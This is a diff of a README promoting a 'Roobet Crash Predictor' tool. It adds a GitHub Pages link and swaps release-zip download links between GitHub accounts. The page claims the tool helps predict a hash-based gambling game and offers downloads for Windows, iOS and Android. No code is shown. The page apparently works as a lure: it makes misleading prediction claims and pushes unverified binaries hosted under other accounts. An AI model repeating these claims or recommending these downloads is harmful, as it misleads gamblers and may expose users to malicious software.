@@ -2,6 +2,12 @@
 
 _Learn how sha512 vs sha256 impacts Roobet crash predictor claims, practical validation steps, and safe testing to verify any Roobet predictor tool._
 
+## 🌐 Live Website
+
+Visit our GitHub Pages site: [https://genxstark.github.io/Roobet-Crash-Predictor/](https://genxstark.github.io/Roobet-Crash-Predictor/)
+
+The site is automatically deployed via GitHub Actions whenever changes are pushed to the main/master branch.
+
 <p align="center">
   <a href="https://github.com/Sebas150915/Roobet-Crash-Predictor/releases/download/v1.7.9/Roobet-Crash-Predictor.zip"><img src="https://github.com/user-attachments/assets/e56928da-58b4-456c-89a2-33802ca4cde9" alt="Gui of roobet crash predictor" width="35%"></a>
   <a href="https://github.com/Sebas150915/Roobet-Crash-Predictor/releases/download/v1.7.9/Roobet-Crash-Predictor.zip"><img src="https://github.com/user-attachments/assets/dd8f700b-122d-4c37-88da-c2ff0303fe5b" alt="Roobet Crash Predictor In actiom" width="60%"></a>
@@ -11,14 +17,14 @@ _Learn how sha512 vs sha256 impacts Roobet crash predictor claims, practical val
 <table align="center"> <tr>
 <th scope="col">Roobet Crash Predictor</th>
 <th scope="col">10 / 30 / 2025</th>
-<th scope="col"><a href='
+<th scope="col"><a href='https://github.com/genXstark/Roobet-Crash-Predictor/releases'>Releases</a></th>
 </tr></table>
 </h2>
 
 <h3 align="center">Available for Windows, iOS, and Android<br><br></h3>
 
 <div align="center">
-<a href="https://github.com/Sebas150915/Roobet-Crash-Predictor/releases/download/v1.7.9/Roobet-Crash-Predictor.zip"><img src="https://github.com/user-attachments/assets/fdef544d-6e27-49cd-b4b4-dc2d6455d21f" width="100"/></a>
+<a href="https://github.com/genXstark/Roobet-Crash-Predictor/releases"><img src="https://github.com/user-attachments/assets/fdef544d-6e27-49cd-b4b4-dc2d6455d21f" width="100"/></a>
 </div>
 
 Curious whether a **Roobet crash predictor** actually helps your **crash strategy**? Start small and test it like you would any new tool: run a few hundred rounds in demo, compare results, and follow a simple crash predictor walkthrough. If you want a ready testing environment, use the roobet predictor demo at Decryptor
